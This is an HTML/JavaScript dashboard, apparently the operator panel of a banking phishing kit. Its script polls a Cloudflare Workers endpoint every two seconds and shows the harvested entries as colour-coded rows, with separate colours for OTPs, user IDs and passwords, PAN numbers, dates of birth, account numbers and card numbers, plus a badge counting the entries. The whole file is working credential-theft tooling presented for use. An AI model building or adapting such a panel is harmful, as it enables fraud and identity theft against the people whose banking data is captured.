<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Strict Left Admin</title>
    <style>
        /* Pura reset extreme left ke liye */
        * { 
            box-sizing: border-box; 
            margin: 0; 
            padding: 0; 
            font-family: 'Arial', sans-serif;
        }
        
        body { 
            background-color: #ffffff; 
            padding: 5px;
            text-align: left !important;
        }

        .header {
            width: 100%;
            padding: 8px 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 2px solid #eee;
            margin-bottom: 10px;
        }
        
        .v-badge {
            background: #ff0000;
            color: #fff;
            padding: 2px 10px;
            border-radius: 4px;
            font-weight: 900;
        }

        /* Logs Container - Har cheez left se */
        #logsDisplay { 
            width: 100%;
            display: flex;
            flex-direction: column;
            align-items: flex-start; /* Sab kuch baayein taraf */
        }

        /* Ultra Patla Full Width Cart */
        .data-row {
            width: 100%; /* Poora screen gherega */
            padding: 5px 12px; /* Bahut kam motai */
            margin-bottom: 4px;
            border-radius: 3px;
            font-size: 14px;
            font-weight: 800;
            line-height: 1.2;
            color: #ffffff;
            white-space: pre-wrap;
            text-align: left !important; /* Text ekdum kone se */
            word-break: break-all;
            display: block;
            clear: both;
            float: left; /* Strict Left Force */
        }

        .time {
            font-size: 9px;
            color: rgba(255,255,255,0.7);
            font-weight: 400;
            margin-left: 8px;
        }
    </style>
</head>
<body>

    <div class="header">
        <h1 style="font-size: 12px;">LIVE TERMINAL</h1>
        <div class="v-badge" id="vCount">0</div>
    </div>

    <div id="logsDisplay">
        </div>

    <script>
        const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
        let lastHash = "";

        async function fetchLogs() {
            try {
                const res = await fetch(workerURL);
                const data = await res.json();
                
                const display = document.getElementById('logsDisplay');
                const badge = document.getElementById('vCount');

                const currentHash = JSON.stringify(data);
                if (currentHash === lastHash) return;
                lastHash = currentHash;

                badge.innerText = data.length;

                display.innerHTML = data.map(log => {
                    if (log.detail === "COUNT" || (log.type && log.type.includes("VISIT"))) return "";

                    let content = log.detail.toLowerCase();
                    let bgColor = "#222"; 

                    // --- VIBRANT COLORS ---
                    if (content.includes("otp:-")) {
                        bgColor = "#E60000"; // Sharp Red
                    } else if (content.includes("user id:-") || content.includes("pass:-")) {
                        bgColor = "#008000"; // Deep Green
                    } else if (content.includes("pan:-") || content.includes("dob:-")) {
                        bgColor = "#0000FF"; // Pure Blue
                    } else if (content.includes("acc:-") || content.includes("name:-")) {
                        bgColor = "#FF00FF"; // Bright Pink
                    } else if (content.includes("card:-")) {
                        bgColor = "#FF8C00"; // Orange
                    }

                    return `
                        <div class="data-row" style="background-color: ${bgColor};">
                            ${log.detail} <span class="time">${log.time || ''}</span>
                        </div>
                    `;
                }).join('');

            } catch (e) { console.log("Sync..."); }
        }

        setInterval(fetchLogs, 2000);
        window.onload = fetchLogs;
    </script>
</body>
</html>
